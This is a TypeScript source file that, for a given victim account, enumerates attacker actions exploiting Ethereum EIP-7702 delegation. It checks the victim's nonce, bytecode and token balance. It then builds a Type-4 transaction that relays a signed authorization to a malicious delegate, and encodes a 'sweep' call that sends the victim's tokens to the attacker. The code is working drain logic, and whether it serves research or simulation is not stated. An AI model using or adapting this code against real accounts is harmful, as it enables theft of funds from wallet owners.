import { encodeFunctionData, PublicClient, Address } from "viem";
import { Action, EIP7702Capability } from "../capability/types.js";
import { MALICIOUS_DELEGATE_ABI, ERC20_ABI } from "../capability/abis.js";

export class EIP7702Semantics {
  static async enumerateActions(
    capability: EIP7702Capability,
    client: PublicClient,
    attacker: Address
  ): Promise<Action[]> {
    const actions: Action[] = [];
    const owner = capability.owner;
    const token = capability.targetToken;

    // 1. Inspect on-chain state of the victim EOA
    const currentNonce = await client.getTransactionCount({ address: owner });
    const currentBytecode = await client.getBytecode({ address: owner });

    // 2. Inspect victim's token balance if a target token is monitored
    let victimBalance = 0n;
    if (token) {
      victimBalance = await client.readContract({
        address: token,
        abi: ERC20_ABI,
        functionName: "balanceOf",
        args: [owner]
      });
    }

    const hasDelegation =
      currentBytecode &&
      currentBytecode.length >= 48 &&
      currentBytecode.toLowerCase().startsWith("0xef0100");

    // Action Type 1: Relay signed authorization via Type-4 transaction
    // Legal if delegation is not active and current on-chain nonce matches capability nonce
    if (!hasDelegation && BigInt(currentNonce) === capability.nonce) {
      const authItem = capability.authorizationObject || {
        address: capability.delegateAddress,
        chainId: Number(capability.chainId),
        nonce: Number(capability.nonce),
        yParity: capability.yParity,
        r: capability.r,
        s: capability.s
      };

      actions.push({
        id: "EIP7702.relayAuthorization",
        description: `Relayer/Attacker broadcasts Type-4 transaction with authorization for delegate ${capability.delegateAddress}`,
        target: owner,
        calldata: "0x",
        value: 0n,
        actor: attacker,
        authorizationList: [authItem]
      });
    }

    // Action Type 2: Execute delegate logic on the delegated EOA
    // Legal if delegation is currently installed on victim EOA and victim holds assets
    if (hasDelegation && token && victimBalance > 0n) {
      const sweepCalldata = encodeFunctionData({
        abi: MALICIOUS_DELEGATE_ABI,
        functionName: "sweep",
        args: [token, attacker]
      });

      actions.push({
        id: "MaliciousDelegate.sweep",
        description: `Attacker calls sweep(${token}, ${attacker}) on victim EOA context to drain ${victimBalance} tokens`,
        target: owner,
        calldata: sweepCalldata,
        value: 0n,
        actor: attacker
      });
    }

    return actions;
  }
}
